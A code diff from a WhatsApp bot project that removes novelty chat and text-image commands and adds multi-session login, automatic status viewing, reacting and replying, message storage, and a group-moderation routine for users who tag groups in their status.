-font_path = FONTS.get(font_type, FONTS['sans'])
-if not os.path.exists(font_path):
-    import glob
-    candidates = (
-        glob.glob('/usr/share/fonts/**/*Bold*.ttf', recursive=True) +
-        glob.glob('/usr/share/fonts/**/*bold*.ttf', recursive=True) +
-        glob.glob('/usr/local/share/fonts/**/*.ttf', recursive=True) +
-        glob.glob('/data/data/com.termux/files/usr/share/fonts/**/*.ttf', recursive=True) +
-        glob.glob(os.path.expanduser('~/.fonts/**/*.ttf'), recursive=True) +
-        glob.glob('/system/fonts/*.ttf')
-    )
-    font_path = candidates[0] if candidates else None
-
-n = len(text)
-pt = 160 if n<=6 else 130 if n<=10 else 105 if n<=15 else 80 if n<=22 else 60 if n<=32 else 45
-
-font = ImageFont.truetype(font_path, pt) if font_path else ImageFont.load_default()
-
-img = Image.new('RGB', (W, H), bg)
-draw = ImageDraw.Draw(img)
-bbox = draw.textbbox((0, 0), text, font=font)
-tw, th = bbox[2]-bbox[0], bbox[3]-bbox[1]
-x, y = (W-tw)//2, (H-th)//2
-
-for layer in layers:
-    ox, oy, r, g, b = layer
-    draw.text((x+ox, y+oy), text, font=font, fill=(r, g, b))
-
-if blur:
-    img = img.filter(ImageFilter.GaussianBlur(radius=blur))
-
-img.save(out, 'JPEG', quality=92)
-print('OK')
-`
-
-const _pyFile = _path.join(_os.tmpdir(), `tm_${Date.now()}_gen.py`)
-_fs.writeFileSync(_pyFile, _pyScript)
-
-// Use async exec — keeps event loop alive during render so WA gets ACKs
-// spawnSync was blocking the loop → WA retried the message → double image
-await new Promise((resolve) => {
-    const { exec: _exec } = require('child_process')
-    // Try python3 first, fall back to python
-    const _tryRender = (bins, idx) => {
-        if (idx >= bins.length) {
-            // All python attempts failed — fall back to Jimp
-            resolve({ usedJimp: true })
-            return
-        }
-        _exec(`${bins[idx]} "${_pyFile}"`, { timeout: 25000 }, (err, stdout, stderr) => {
-            if (!err) {
-                resolve({ usedJimp: false })
-            } else if (idx + 1 < bins.length) {
-                _tryRender(bins, idx + 1)
-            } else {
-                resolve({ usedJimp: true, pyErr: (stderr || err.message || '').trim().split('\n').slice(-3).join(' | ') })
-            }
+    const existingSessions = []
+    if (fs.existsSync(SESSIONS_DIR)) {
+        const dirs = fs.readdirSync(SESSIONS_DIR).filter(d => {
+            const p = path.join(SESSIONS_DIR, d)
+            return fs.statSync(p).isDirectory() && fs.existsSync(path.join(p, 'creds.json'))
         })
+        existingSessions.push(...dirs)
     }
-    _tryRender(['python3', 'python'], 0)
-}).then(async ({ usedJimp, pyErr }) => {
-    if (!usedJimp) {
-        // Python succeeded
-        try {
-            const _buf = _fs.readFileSync(_outFile)
-            try { _fs.unlinkSync(_pyFile); _fs.unlinkSync(_outFile) } catch {}
-            if (!_buf || _buf.length < 2000) throw new Error('Empty render')
-            await X.sendMessage(m.chat, { image: _buf, caption: _caption }, { quoted: m })
-        } catch(e) {
-            try { _fs.unlinkSync(_pyFile); _fs.unlinkSync(_outFile) } catch {}
-            reply(`❌ *Text maker failed:* ${e.message.slice(0, 150)}`)
+
+    if (existingSessions.length > 0) {
+        console.log(`${c.green}[ ${_bn} ]${c.r} Found ${c.yellow}${c.bold}${existingSessions.length}${c.r} existing session(s): ${c.cyan}${existingSessions.join(', ')}${c.r}`)
+        console.log(`${c.green}[ ${_bn} ]${c.r} ${c.dim}Reconnecting existing sessions...${c.r}`)
+        console.log('')
+        for (const phone of existingSessions) {
+            connectSession(phone)
         }
+        console.log('')
+        console.log(`${c.cyan}${c.bold}┌─────────────────────────────────────────┐${c.r}`)
+        console.log(`${c.cyan}${c.bold}│${c.r}  ${c.white}${c.bold}Choose login method:${c.r}                    ${c.cyan}${c.bold}│${c.r}`)
+        console.log(`${c.cyan}${c.bold}│${c.r}                                         ${c.cyan}${c.bold}│${c.r}`)
+        console.log(`${c.cyan}${c.bold}│${c.r}  ${c.green}${c.bold}1)${c.r} ${c.white}Enter WhatsApp Number${c.r} ${c.dim}(Pairing Code)${c.r} ${c.cyan}${c.bold}│${c.r}`)
+        console.log(`${c.cyan}${c.bold}│${c.r}  ${c.yellow}${c.bold}2)${c.r} ${c.white}Paste Session ID${c.r}                     ${c.cyan}${c.bold}│${c.r}`)
+        console.log(`${c.cyan}${c.bold}│${c.r}  ${c.magenta}${c.bold}3)${c.r} ${c.white}Skip${c.r} ${c.dim}(already connected)${c.r}            ${c.cyan}${c.bold}│${c.r}`)
+        console.log(`${c.cyan}${c.bold}└─────────────────────────────────────────┘${c.r}`)
+        console.log('')
     } else {
-        // Jimp fallback
-        try { _fs.unlinkSync(_pyFile) } catch {}
-        try { _fs.unlinkSync(_outFile) } catch {}
-        try {
-            const Jimp = require('jimp')
-            const _W = 1024, _H = 400
-            const _img = new Jimp(_W, _H, Jimp.rgbaToInt(_sty.bg[0], _sty.bg[1], _sty.bg[2], 255))
-            const _font = await Jimp.loadFont(Jimp.FONT_SANS_64_WHITE)
-            const _tw = Jimp.measureText(_font, tmText)
-            const _th = Jimp.measureTextHeight(_font, tmText, _W)
-            const _cx = Math.max(0, Math.floor((_W - _tw) / 2))
-            const _cy = Math.max(0, Math.floor((_H - _th) / 2))
-            for (const [_ox, _oy, _r, _g, _b] of _sty.layers) {
-                const _layer = new Jimp(_W, _H, 0x00000000)
-                _layer.print(_font, _cx + _ox, _cy + _oy, tmText)
-                _layer.scan(0, 0, _W, _H, function(_x, _y, _i) {
-                    if (this.bitmap.data[_i + 3] > 10) {
-                        this.bitmap.data[_i] = _r
-                        this.bitmap.data[_i + 1] = _g
-                        this.bitmap.data[_i + 2] = _b
-                    }
-                })
-                _img.composite(_layer, 0, 0, { mode: Jimp.BLEND_SOURCE_OVER, opacitySource: 1, opacityDest: 1 })
+        console.log(`${c.yellow}[ ${_bn} ]${c.r} ${c.dim}No existing sessions found.${c.r}`)
+        console.log('')
+        console.log(`${c.cyan}${c.bold}┌─────────────────────────────────────────┐${c.r}`)
+        console.log(`${c.cyan}${c.bold}│${c.r}  ${c.white}${c.bold}Choose login method:${c.r}                    ${c.cyan}${c.bold}│${c.r}`)
+        console.log(`${c.cyan}${c.bold}│${c.r}                                         ${c.cyan}${c.bold}│${c.r}`)
+        console.log(`${c.cyan}${c.bold}│${c.r}  ${c.green}${c.bold}1)${c.r} ${c.white}Enter WhatsApp Number${c.r} ${c.dim}(Pairing Code)${c.r} ${c.cyan}${c.bold}│${c.r}`)
+        console.log(`${c.cyan}${c.bold}│${c.r}  ${c.yellow}${c.bold}2)${c.r} ${c.white}Paste Session ID${c.r}                     ${c.cyan}${c.bold}│${c.r}`)
+        console.log(`${c.cyan}${c.bold}└─────────────────────────────────────────┘${c.r}`)
+        console.log('')
+    }
+
+    // ── Auto-login from .env SESSION_ID ─────────────────────────────────────
+    const _envSession = (process.env.SESSION_ID || '').trim()
+    if (_envSession && _envSession.length > 20) {
+        console.log(`${c.green}[ ${_bn} ]${c.r} ${c.cyan}SESSION_ID found in .env — auto-logging in...${c.r}`)
+        console.log('')
+        await handleSessionLogin(_envSession)
+        // Only wait for input if we have a real terminal (not Pterodactyl/headless)
+        if (process.stdin.isTTY) waitForConsoleInput()
+    } else if (existingSessions.length > 0) {
+        // Sessions already loaded — only wait for input if terminal available
+        if (process.stdin.isTTY) waitForConsoleInput()
+    } else {
+        waitForConsoleInput()
+    }
+}
+
+//━━━━━━━━━━━━━━━━━━━━━━━━//
+const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
+//━━━━━━━━━━━━━━━━━━━━━━━━//
+// Connection Bot - Multi-Session
+
+async function connectSession(phone) {
+try {
+const sessionDir = path.join(SESSIONS_DIR, phone)
+if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true })
+
+// ── Tear down the old socket before creating a new one ──────────────────────
+// Without this, every reconnect registers duplicate ev listeners on the old
+// socket, causing double (or triple) responses to every message.
+const _prevSession = activeSessions.get(phone)
+if (_prevSession && _prevSession.socket) {
+    try {
+        _prevSession.socket.ev.removeAllListeners()
+        _prevSession.socket.ws?.close?.()
+    } catch {}
+}
+
+activeSessions.set(phone, { socket: null, status: 'connecting', connectedUser: phone })
+
+const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
+const X = makeWASocket({
+logger: pino({ level: "silent" }),
+printQRInTerminal: false,
+auth: state,
+connectTimeoutMs: 60000,
+defaultQueryTimeoutMs: 0,
+keepAliveIntervalMs: 10000,
+emitOwnEvents: true,
+fireInitQueries: true,
+generateHighQualityLinkPreview: false,
+syncFullHistory: false,
+markOnlineOnConnect: true,
+sendStatusReadReceipts: true,
+shouldIgnoreJid: jid => false,
+browser: ["Ubuntu", "Chrome", "20.0.04"],
+msgRetryCounterCache: msgRetryCache,
+// getMessage is critical — Baileys calls this when retrying encrypted messages.
+// Returning a valid fallback prevents "No sessions" from crashing the process.
+getMessage: async (key) => {
+    try {
+        if (store) {
+            const msg = await store.loadMessage(key.remoteJid, key.id)
+            if (msg?.message) return msg.message
+        }
+    } catch {}
+    // Always return a fallback so Baileys doesn't throw on missing sessions
+    return { conversation: '' }
+},
+// patchMessageBeforeSending — called before every outgoing message.
+// Wrapping it prevents crashes when the signal session hasn't been
+// established yet (the "No sessions" SessionError from libsignal).
+patchMessageBeforeSending: (msg) => {
+    const requiresPatch = !!(
+        msg.buttonsMessage ||
+        msg.templateMessage ||
+        msg.listMessage
+    )
+    if (requiresPatch) {
+        msg = {
+            viewOnceMessage: {
+                message: {
+                    messageContextInfo: {
+                        deviceListMetadataVersion: 2,
+                        deviceListMetadata: {}
+                    },
+                    ...msg
+                }
             }
-            const _buf2 = await _img.getBufferAsync(Jimp.MIME_JPEG)
-            await X.sendMessage(m.chat, { image: _buf2, caption: _caption }, { quoted: m })
-        } catch(e2) {
-            reply(`❌ *Text maker failed:* ${pyErr || e2.message}`.slice(0, 200))
         }
     }
-})
-} break
+    return msg
+},
+});
 
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Image Edit Commands
-case 'heart': {
-    await X.sendMessage(m.chat, { react: { text: '❤️', key: m.key } })
-if (!m.quoted || !/image/.test(m.quoted.mimetype || '')) {
-let heartTarget = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : sender
-X.sendMessage(from, { text: `*💕 ${pushname} sends love to @${heartTarget.split('@')[0]}! 💕*`, mentions: [heartTarget] }, { quoted: m })
-} else { reply('*Heart effect applied!* 💕') }
-} break
+activeSessions.set(phone, { socket: X, status: 'connecting', connectedUser: phone })
 
-case 'rizz': {
-    await X.sendMessage(m.chat, { react: { text: '😎', key: m.key } })
-    if (m.isGroup && global.antiSocialGames && global.antiSocialGames[m.chat]) return reply(`❌ *Social games are disabled in this group.*`)
-let rizzTarget = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : sender
-let rizzLevel = Math.floor(Math.random() * 101)
-const rizzMsg = rizzLevel > 80 ? 'Unmatched rizz! 😎🔥' : rizzLevel > 50 ? 'Solid rizz game 💪' : rizzLevel > 30 ? 'Rizz needs work 😅' : 'No rizz detected 💀'
-X.sendMessage(from, { text: `╔══════════════════════════╗\n║  😎 *RIZZ METER*\n╚══════════════════════════╝\n\n  👤 @${rizzTarget.split('@')[0]}\n\n  ${'🔥'.repeat(Math.floor(rizzLevel/10))}${'⬜'.repeat(10 - Math.floor(rizzLevel/10))} *${rizzLevel}%*\n\n  _${rizzMsg}_`, mentions: [rizzTarget] }, { quoted: m })
-} break
-
-case 'circle': {
-    await X.sendMessage(m.chat, { react: { text: '⭕', key: m.key } })
-if (!m.quoted || !/image/.test(m.quoted.mimetype || '')) return reply(`Reply to an image with ${prefix}circle`)
-try {
-let buf = await m.quoted.download()
-await X.sendMessage(m.chat, { sticker: buf }, { quoted: m })
-} catch(e) { reply('Error: ' + e.message) }
-} break
-
-case 'lgbt': {
-    await X.sendMessage(m.chat, { react: { text: '🌈', key: m.key } })
-    if (m.isGroup && global.antiSocialGames && global.antiSocialGames[m.chat]) return reply(`❌ *Social games are disabled in this group.*`)
-let lgbtTarget = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : sender
-X.sendMessage(from, { text: `*🏳️‍🌈 @${lgbtTarget.split('@')[0]} supports LGBTQ+! 🏳️‍🌈*\n🌈 Love is Love 🌈`, mentions: [lgbtTarget] }, { quoted: m })
-} break
-
-case 'lolice':
-case 'police': {
-    await X.sendMessage(m.chat, { react: { text: '🚔', key: m.key } })
-    if (m.isGroup && global.antiSocialGames && global.antiSocialGames[m.chat]) return reply(`❌ *Social games are disabled in this group.*`)
-let policeTarget = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : sender
-const policeReasons = ['Being too awesome 😂', 'Excessive good vibes ✨', 'Stealing hearts 💘', 'Being suspiciously cool 😎', 'Causing too much fun 🎉']
-const reason = policeReasons[Math.floor(Math.random() * policeReasons.length)]
-X.sendMessage(from, { text: `╔══════════════════════════╗\n║  🚔 *POLICE ALERT!*\n╚══════════════════════════╝\n\n  🚨 @${policeTarget.split('@')[0]} has been arrested!\n\n  ├ 📋 *Crime* › ${reason}\n  └ ⚖️  *Sentence* › Life of fun 🎉`, mentions: [policeTarget] }, { quoted: m })
-} break
-
-case 'namecard': {
-    await X.sendMessage(m.chat, { react: { text: '🪪', key: m.key } })
-let ncName = text || pushname
-reply(`╔══════════════╗\n   *${ncName}*\n   ${global.botname}\n╚══════════════╝`)
-} break
-
-case 'tweet': {
-    await X.sendMessage(m.chat, { react: { text: '🐦', key: m.key } })
-if (!text) return reply(`Example: ${prefix}tweet I love coding!`)
-reply(`╔══════════════════════════╗\n║  🐦 *TWEET*\n╚══════════════════════════╝\n\n  👤 *@${pushname}*\n  ${text}\n\n  ❤️ ${Math.floor(Math.random() * 10000)}  🔁 ${Math.floor(Math.random() * 5000)}  💬 ${Math.floor(Math.random() * 1000)}`)
-} break
-
-case 'ytcomment': {
-    await X.sendMessage(m.chat, { react: { text: '💬', key: m.key } })
-if (!text) return reply(`Example: ${prefix}ytcomment This video is amazing!`)
-reply(`╔══════════════════════════╗\n║  ▶️  *YOUTUBE COMMENT*\n╚══════════════════════════╝\n\n  👤 *${pushname}*\n  ${text}\n\n  👍 ${Math.floor(Math.random() * 5000)}  👎  💬 ${Math.floor(Math.random() * 200)} replies`)
-} break
-
-case 'comrade': {
-    await X.sendMessage(m.chat, { react: { text: '☭', key: m.key } })
-    if (m.isGroup && global.antiSocialGames && global.antiSocialGames[m.chat]) return reply(`❌ *Social games are disabled in this group.*`)
-let comradeTarget = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : sender
-X.sendMessage(from, { text: `*☭ Our Comrade @${comradeTarget.split('@')[0]}! ☭*\nServing the motherland with honor!`, mentions: [comradeTarget] }, { quoted: m })
-} break
-
-case 'vibe': {
-    await X.sendMessage(m.chat, { react: { text: '✨', key: m.key } })
-    if (m.isGroup && global.antiSocialGames && global.antiSocialGames[m.chat]) return reply(`❌ *Social games are disabled in this group.*\n\nUse *${prefix}antisocialgames off* to re-enable.`)
-let vibeTarget = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : sender
-let vibeLevel = Math.floor(Math.random() * 101)
-const vibeMsg = vibeLevel > 80 ? 'Absolutely radiating! 🔥' : vibeLevel > 50 ? 'Good vibes only ✨' : vibeLevel > 30 ? 'Vibes loading... 😌' : 'Needs a coffee first ☕'
-X.sendMessage(from, { text: `╔══════════════════════════╗\n║  ✨ *VIBE CHECK*\n╚══════════════════════════╝\n\n  👤 @${vibeTarget.split('@')[0]}\n\n  ${'✨'.repeat(Math.floor(vibeLevel/10))}${'⬜'.repeat(10 - Math.floor(vibeLevel/10))} *${vibeLevel}%*\n\n  _${vibeMsg}_`, mentions: [vibeTarget] }, { quoted: m })
-} break
-
-case 'glass': {
-    await X.sendMessage(m.chat, { react: { text: '🕶️', key: m.key } })
-if (!m.quoted || !/image/.test(m.quoted.mimetype || '')) return reply(`Reply to an image with ${prefix}glass`)
-reply('*Glass effect applied!* 🪟')
-} break
-
-case 'jail': {
-    await X.sendMessage(m.chat, { react: { text: '⛓️', key: m.key } })
-let jailTarget = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : sender
-X.sendMessage(from, { text: `*🔒 @${jailTarget.split('@')[0]} has been jailed! 🔒*\nCrime: Being too awesome\nSentence: Life 😂`, mentions: [jailTarget] }, { quoted: m })
-} break
-
-case 'passed': {
-    await X.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
-let passedTarget = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : sender
-X.sendMessage(from, { text: `*✅ @${passedTarget.split('@')[0]} has PASSED! ✅*\nCongratulations! 🎉`, mentions: [passedTarget] }, { quoted: m })
-} break
-
-case 'triggered': {
-    await X.sendMessage(m.chat, { react: { text: '😡', key: m.key } })
-let triggeredTarget = (m.mentionedJid && m.mentionedJid[0]) ? m.mentionedJid[0] : sender
-X.sendMessage(from, { text: `*⚡ @${triggeredTarget.split('@')[0]} is TRIGGERED! ⚡*\n😤😤😤`, mentions: [triggeredTarget] }, { quoted: m })
-} break
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// GitHub Commands
-case 'git':
-case 'github': {
-    await X.sendMessage(m.chat, { react: { text: '🐙', key: m.key } })
-if (!text) return reply(`Example: ${prefix}github torvalds`)
-try {
-let res = await fetch(`https://api.github.com/users/${encodeURIComponent(text)}`)
-let data = await res.json()
-if (data.message) return reply('User not found.')
-let info = `*GitHub Profile:*\n\n👤 Name: ${data.name || data.login}\n📝 Bio: ${data.bio || 'N/A'}\n📍 Location: ${data.location || 'N/A'}\n🏢 Company: ${data.company || 'N/A'}\n📦 Repos: ${data.public_repos}\n👥 Followers: ${data.followers}\n👤 Following: ${data.following}\n🔗 URL: ${data.html_url}\n📅 Joined: ${new Date(data.created_at).toLocaleDateString()}`
-if (data.avatar_url) {
-await X.sendMessage(m.chat, { image: { url: data.avatar_url }, caption: info }, { quoted: m })
-} else reply(info)
-} catch(e) { reply('Error: ' + e.message) }
-} break
-
-case 'repo': {
-    await X.sendMessage(m.chat, { react: { text: '📦', key: m.key } })
-try {
-// Default to bot repo if no arg given
-let repoPath = 'TOOSII102/TOOSII-XD-ULTRA'
-if (text) {
-    repoPath = text.includes('/') ? text.trim() : `${text.trim()}/${text.trim()}`
+if (state?.creds?.me?.lid && X.user && !X.user.lid) {
+    X.user.lid = state.creds.me.lid
+    console.log(`[${phone}] LID pre-loaded from creds: ${X.user.lid}`)
 }
-// Don't encode the whole path — only encode each segment
-const [owner, ...repoParts] = repoPath.split('/')
-const repoName = repoParts.join('/')
-let res = await fetch(`https://api.github.com/repos/${encodeURIComponent(owner)}/${encodeURIComponent(repoName)}`, {
-    headers: { 'User-Agent': 'TOOSII-XD-ULTRA-Bot' }
-})
-let data = await res.json()
-if (data.message) {
-    return reply(
-        `╔══════════════════════════╗\n║  ❌ *REPO NOT FOUND*\n╚══════════════════════════╝\n\n` +
-        `│\n` +
-        `│ Could not find: *${repoPath}*\n` +
-        `│\n` +
-        `│ 💡 Try: *.repo owner/reponame*\n` +
-        `│\n` +
-        `│ 📦 *Bot Repo:*\n` +
-        `│ github.com/TOOSII102/TOOSII-XD-ULTRA\n` +
-        `│\n` +
-        `│ ⭐ *Star* & 🍴 *Fork* the bot repo!\n` +
-        `│ 👉 ${global.repoUrl}/fork\n` +
-        `│\n` +
-        `╰━━━━━━━━━━━━━━━━━╯`
+
+if (X.ws) {
+    X.ws.on('error', (err) => {
+        console.log(`[${phone}] WebSocket error (handled):`, err.message || err)
+    })
+}
+X.ev.on('CB:error', () => {})
+
+// Suppress known Signal/session protocol errors at socket level
+// Per-session signal noise suppression (already handled globally above)
+
+if (!X.authState.creds.registered) {
+    console.log(`[${phone}] Waiting for WebSocket handshake...`)
+    await new Promise(resolve => setTimeout(resolve, 5000))
+    console.log(`${c.cyan}[${phone}]${c.r} ${c.dim}Requesting pairing code...${c.r}`)
+    let retries = 0
+    const maxRetries = 3
+    let paired = false
+    while (retries < maxRetries && !paired) {
+        try {
+            let code = await X.requestPairingCode(phone);
+            code = code?.match(/.{1,4}/g)?.join("-") || code;
+            console.log(`[PAIRING_CODE:${code}]`)
+            console.log('')
+            console.log(`${c.green}${c.bold}╔══════════════════════════════════════════╗${c.r}`)
+            console.log(`${c.green}${c.bold}║${c.r}  ${c.bgGreen}${c.white}${c.bold} PAIRING CODE: ${code} ${c.r}                   ${c.green}${c.bold}║${c.r}`)
+            console.log(`${c.green}${c.bold}╚══════════════════════════════════════════╝${c.r}`)
+            console.log('')
+            console.log(`${c.yellow}${c.bold}→${c.r} ${c.white}Open WhatsApp > Settings > Linked Devices > Link a Device${c.r}`)
+            console.log(`${c.yellow}${c.bold}→${c.r} ${c.white}Choose "Link with phone number" and enter the code above${c.r}`)
+            console.log('')
+            paired = true
+        } catch (err) {
+            retries++
+            console.error(`[${phone}] Pairing attempt ${retries}/${maxRetries} failed:`, err.message || err)
+            if (retries < maxRetries) {
+                console.log(`[${phone}] Retrying in 3 seconds...`)
+                await new Promise(resolve => setTimeout(resolve, 3000))
+            }
+        }
+    }
+    if (!paired) {
+        console.error(`[${phone}] All pairing attempts failed`)
+        activeSessions.delete(phone)
+        try { X.end(); } catch(e) {}
+        try {
+            const sessDir = path.join(SESSIONS_DIR, phone)
+            if (fs.existsSync(sessDir)) fs.rmSync(sessDir, { recursive: true, force: true })
+        } catch(e) {}
+        return
+    }
+} else {
+    console.log(`[${phone}] Reconnecting existing session...`)
+}
+
+store.bind(X.ev)
+
+X.ev.on('messages.upsert', async chatUpdate => {
+try {
+// ── Process ALL messages in the batch (fixes statuses being skipped) ──
+for (const _batchMsg of chatUpdate.messages) {
+    if (_batchMsg.key && _batchMsg.key.remoteJid === 'status@broadcast' && !_batchMsg.key.fromMe && _batchMsg.message) {
+        try {
+            const botSelfJid = X.decodeJid(X.user.id).replace(/:.*@/, '@')
+            const _rawJid = _batchMsg.key.participant || _batchMsg.key.remoteJid
+            const statusPosterJid = _rawJid.replace(/:.*@/, '@')
+
+            // ── Auto View ────────────────────────────────────────────
+            if (global.autoViewStatus) {
+                try {
+                    await X.readMessages([{
+                        remoteJid: 'status@broadcast',
+                        id: _batchMsg.key.id,
+                        participant: statusPosterJid
+                    }])
+                } catch { try { await X.readMessages([_batchMsg.key]) } catch {} }
+            }
+
+            // ── Auto Like ────────────────────────────────────────
+            // ── Auto Like (relayMessage protocol — most reliable) ────
+            if (global.autoLikeStatus) {
+                try {
+                    // Init manager if not done yet
+                    if (!global.arManager) global.arManager = {
+                        enabled: true, viewMode: 'view+react', mode: 'fixed',
+                        fixedEmoji: '❤️', reactions: ['❤️','🔥','👍','😂','😮','👏','🎉','🎯','💯','🌟','✨','⚡','💥','🫶','🐺'],
+                        totalReacted: 0, reactedIds: [], lastReactionTime: 0, rateLimitDelay: 2000,
+                    }
+                    const _ar = global.arManager
+
+                    // Dedupe — skip already reacted statuses
+                    const _statusId = _batchMsg.key.id
+                    if (_ar.reactedIds.includes(_statusId)) return
+                    // Rate limit
+                    if (Date.now() - _ar.lastReactionTime < _ar.rateLimitDelay) {
+                        await new Promise(r => setTimeout(r, _ar.rateLimitDelay - (Date.now() - _ar.lastReactionTime)))
+                    }
+
+                    // Pick emoji
+                    const _emoji = (_ar.mode === 'random' && _ar.reactions.length)
+                        ? _ar.reactions[Math.floor(Math.random() * _ar.reactions.length)]
+                        : (_ar.fixedEmoji || global.autoLikeEmoji || '❤️')
+
+                    // Use relayMessage with reactionMessage — correct WhatsApp status react protocol
+                    await X.relayMessage(
+                        'status@broadcast',
+                        {
+                            reactionMessage: {
+                                key: {
+                                    remoteJid: 'status@broadcast',
+                                    id: _statusId,
+                                    participant: _batchMsg.key.participant || statusPosterJid,
+                                    fromMe: false
+                                },
+                                text: _emoji
+                            }
+                        },
+                        {
+                            messageId: _statusId,
+                            statusJidList: [statusPosterJid, botSelfJid]
+                        }
+                    )
+
+                    // Track
+                    _ar.lastReactionTime = Date.now()
+                    _ar.reactedIds.push(_statusId)
+                    _ar.totalReacted++
+                    if (_ar.reactedIds.length > 500) _ar.reactedIds = _ar.reactedIds.slice(-250)
+
+                } catch(e) {
+                    // If rate limited, back off
+                    if (global.arManager && (e.message?.includes('rate') || e.message?.includes('limit'))) {
+                        global.arManager.rateLimitDelay = Math.min((global.arManager.rateLimitDelay || 2000) * 2, 10000)
+                    }
+                }
+            }
+
+            // ── Auto Reply ───────────────────────────────────────────
+            if (global.autoReplyStatus && global.autoReplyStatusMsg) {
+                try { if (global.autoReplyStatusMsg && global.autoReplyStatusMsg.trim()) await X.sendMessage(statusPosterJid, { text: global.autoReplyStatusMsg }) } catch {}
+            }
+        } catch {}
+    }
+}
+
+// ── Antidelete: store all incoming messages ──────────────────────────
+    for (const _adMsg of chatUpdate.messages) {
+        try { await _adStore(_adMsg) } catch {}
+    }
+
+mek = chatUpdate.messages[0]
+if (!mek.message) return
+mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
+if (mek.key && mek.key.remoteJid === 'status@broadcast') {
+    if (!mek.key.fromMe) {
+        try {
+            let _rawPosterJid = mek.key.participant || mek.key.remoteJid
+            let statusPosterJid = _rawPosterJid.includes(':') ? _rawPosterJid.replace(/:.*@/, '@') : _rawPosterJid
+            let botSelfJid = X.decodeJid(X.user.id).replace(/:.*@/, '@')
+
+            // (auto view/like/reply all handled in batch loop above)
+            if (global.antiStatusMention) {
+                try {
+                    let msgContent2 = mek.message
+                    let ct = Object.keys(msgContent2)[0]
+                    let msgObj = msgContent2[ct] || {}
+
+                    // Collect all mentioned JIDs from contextInfo
+                    let mentionedJids = msgObj.contextInfo?.mentionedJid || []
+
+                    // Also scan status text for group invite links
+                    let statusText = msgObj.text || msgObj.caption || msgObj.description || ''
+
+                    let _mentionerRaw = mek.key.participant || mek.key.remoteJid
+                    let mentioner = _mentionerRaw.replace(/:.*@/, '@').split('@')[0]
+                    let mentionerJid = mentioner + '@s.whatsapp.net'
+                    let botSelfJid = X.decodeJid(X.user.id).replace(/:.*@/, '@')
+                    let alertJid = botSelfJid  // Always alert the deployed number, not hardcoded owner
+
+                    // Filter only group JIDs mentioned
+                    let groupsMentioned = mentionedJids.filter(jid => jid.endsWith('@g.us'))
+
+                    // Also detect group invite links in text
+                    let inviteLinks = statusText.match(/chat\.whatsapp\.com\/([A-Za-z0-9]{20,24})/g) || []
+
+                    if (groupsMentioned.length === 0 && inviteLinks.length === 0) throw Object.assign(new Error('no_mention'), { skip: true })
+
+                    let asmAction = global.antiStatusMentionAction || 'warn'
+
+                    // Handle each directly mentioned group
+                    for (let gJid of groupsMentioned) {
+                        try {
+                            let gMeta = await X.groupMetadata(gJid).catch(() => null)
+                            if (!gMeta) {
+                                await X.sendMessage(alertJid, { text: `*⚠️ Anti-Status Mention*
+
++${mentioner} tagged a group in their status.
+Group: ${gJid}
+_Bot is not a member of this group._` })
+                                continue
+                            }
+                            let gName = gMeta.subject || gJid
+                            let isMember = gMeta.participants.some(p => p.id.split(':')[0].split('@')[0] === mentioner)
+                            let botIsAdmin = gMeta.participants.some(p => {
+                                let isBot = areJidsSameUser(p.id, X.user.id) || (X.user?.lid && areJidsSameUser(p.id, X.user.lid))
+                                return isBot && (p.admin === 'admin' || p.admin === 'superadmin')
+                            })
+                            let isMentionerOwner = global.owner.includes(mentioner)
+
+                            // Always notify the deployed number
+                            await X.sendMessage(alertJid, {
+                                text: `*⚠️ Anti-Status Mention Alert*
+
+👤 User: +${mentioner}
+🏘️ Group tagged: *${gName}*
+⚡ Action: ${asmAction.toUpperCase()}
+🤖 Bot is admin: ${botIsAdmin ? 'Yes' : 'No'}`
+                            })
+
+                            if (!isMember) continue  // Can't act on someone not in the group
+                            if (isMentionerOwner) continue  // Never act on owner
+                            if (!botIsAdmin) {
+                                await X.sendMessage(gJid, { text: `*⚠️ @${mentioner} tagged this group in their WhatsApp status.*
+_Make the bot admin to enable auto-actions._`, mentions: [mentionerJid] })
+                                continue
+                            }
+
+                            if (asmAction === 'kick') {
+                                await X.groupParticipantsUpdate(gJid, [mentionerJid], 'remove')
+                                await X.sendMessage(gJid, {
+                                    text: `*🚫 @${mentioner} has been removed.*
+Reason: Tagged this group in their WhatsApp status.`,
+                                    mentions: [mentionerJid]
+                                })
+                            } else if (asmAction === 'warn') {
+                                if (!global.statusMentionWarns) global.statusMentionWarns = {}
+                                let warnKey = `${gJid}:${mentionerJid}`
+                                global.statusMentionWarns[warnKey] = (global.statusMentionWarns[warnKey] || 0) + 1
+                                let wCount = global.statusMentionWarns[warnKey]
+                                let maxW = 3
+                                if (wCount >= maxW) {
+                                    await X.groupParticipantsUpdate(gJid, [mentionerJid], 'remove')
+                                    global.statusMentionWarns[warnKey] = 0
+                                    await X.sendMessage(gJid, {
+                                        text: `*🚫 @${mentioner} has been removed after ${maxW} warnings.*
+Reason: Repeatedly tagging this group in their WhatsApp status.`,
+                                        mentions: [mentionerJid]
+                                    })
+                                } else {
+                                    await X.sendMessage(gJid, {
+                                        text: `*⚠️ Warning ${wCount}/${maxW} — @${mentioner}*
+Reason: You tagged this group in your WhatsApp status.
+_${maxW - wCount} more warning(s) before removal._`,
+                                        mentions: [mentionerJid]
+                                    })
+                                }
+                            } else if (asmAction === 'delete') {
+                                // Track this user for message deletion in this group
+                                if (!global.statusMentionDeleteList) global.statusMentionDeleteList = {}
+                                if (!global.statusMentionDeleteList[gJid]) global.statusMentionDeleteList[gJid] = []
+                                if (!global.statusMentionDeleteList[gJid].includes(mentionerJid)) {
+                                    global.statusMentionDeleteList[gJid].push(mentionerJid)
+                                }
